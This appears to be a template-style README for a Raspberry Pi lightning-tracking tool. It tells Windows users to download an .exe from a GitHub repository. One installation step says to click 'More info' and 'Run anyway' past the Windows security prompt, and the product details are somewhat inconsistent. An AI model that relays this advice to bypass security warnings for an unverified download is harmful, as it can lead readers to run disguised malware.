# ⚡ stormwatch-pi - Track local lightning strikes with ease

[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Short-triangle970/stormwatch-pi)

## 📡 About This System

Stormwatch-pi monitors lightning activity in your area. The software connects to your Raspberry Pi hardware to detect electrical discharges in the atmosphere. It processes this data to provide you with real-time updates and alerts about approaching storms.

The system consists of two parts. A background service gathers information from your sensor hardware. A web interface allows you to view the data on your computer screen. You can set alert thresholds to receive notifications when lightning stays within a specific distance from your location.

## 📋 System Requirements

To run this application on your Windows machine, ensure your computer meets these minimum specifications:

*   Operating System: Windows 10 or Windows 11.
*   Memory: 4 GB of RAM.
*   Storage: 200 MB of free disk space.
*   Network: A stable internet connection for the web dashboard.
*   Hardware: A Raspberry Pi connected to your local network with the compatible lightning sensor attached.

## 📥 How to Download

You obtain the software through the official project repository. 

[Visit this page to download the latest setup file](https://github.com/Short-triangle970/stormwatch-pi)

Select the file ending in `.exe` under the latest release section. Save this file to your Downloads folder.

## ⚙️ Installation Steps

Follow these steps to install the program on your computer:

1. Locate the downloaded file in your browser or file manager.
2. Double-click the file to start the installation.
3. Windows might show a security prompt. Click "More info" and then "Run anyway" if the system protects your device.
4. Follow the instructions on the screen to choose your installation folder.
5. Click "Install" to copy the files to your hard drive.
6. Once the process completes, click "Finish" to launch the stormwatch-pi dashboard.

## 🛠️ Initial Setup

When you open the program for the first time, you must link it to your Raspberry Pi device.

1. Ensure your Raspberry Pi is powered on and connected to the same local area network as your computer.
2. Enter the IP address of your Raspberry Pi into the configuration field shown in the dashboard.
3. If you do not know your IP address, check your router settings or use a network scanning tool to identify the device name "stormwatch-pi".
4. Click "Connect" to establish the link.
5. The dashboard now shows a green indicator light confirming a successful connection to your hardware.

## 📊 Using the Dashboard

The dashboard provides a visual map of your surroundings. Each flash detected by your lightning sensor appears on the screen as a marker. 

*   **Current Activity:** View the number of strikes detected in the last hour.
*   **Distance Filter:** Use the slider at the bottom of the screen to focus on storms within a 5, 10, or 20-mile radius.
*   **Alert Settings:** Open the settings menu to enable desktop notifications. You can configure the application to make a sound or show a popup if a strike occurs within your chosen distance.
*   **Data History:** Click the "History" tab to review past storm patterns. You can export these reports as simple text files for your personal records.

## 🔧 Troubleshooting Common Issues

If you experience problems, use these steps to resolve them:

*   **Connection Errors:** If the dashboard cannot find your Raspberry Pi, verify that both the computer and the Pi are on the same Wi-Fi or Ethernet network. Restart your router if the devices still fail to communicate.
*   **No Data Appearing:** Ensure the lightning sensor is plugged into the correct GPIO pin on the Raspberry Pi. Refer to your sensor manual for the specific pin-out diagram.
*   **Application Lag:** Close other programs that consume heavy memory. Stormwatch-pi requires a consistent connection, so avoid running the application through a VPN unless you have configured it to allow local network traffic.
*   **Software Updates:** Check the download page periodically for new versions. Updates provide stability and improve how the application handles incoming sensor data.

## 🛡️ Privacy and Data Security

The software treats your location data with care. All information stays local to your machine. The application does not upload your specific coordinates to a public server. It only transmits small packets of data between your Raspberry Pi and your computer to maintain the real-time link. Your alert settings and history logs remain stored inside the installation folder on your local drive.

## 💡 Frequent Questions

**Do I need a separate power supply for the sensor?**
Most sensors draw power directly from the Raspberry Pi pins. If you notice the system losing connection, consider using a high-quality power supply for the Pi.

**Can I run this on multiple computers?**
You may install the dashboard on as many Windows computers as you wish inside your home. Each dashboard will connect to the same Raspberry Pi to display identical data.

**What happens if the power goes out?**
The system shuts down when the power fails. Once the electricity returns, the Raspberry Pi will reboot automatically if you configured its settings that way. The Windows dashboard requires you to restart it manually after a computer reboot.

**Does the software work without the internet?**
Yes. As long as your computer and Raspberry Pi stay on the same local network, the system tracks lightning strikes without an active external internet connection. You only need the internet to download updates or view map tiles that require online map data.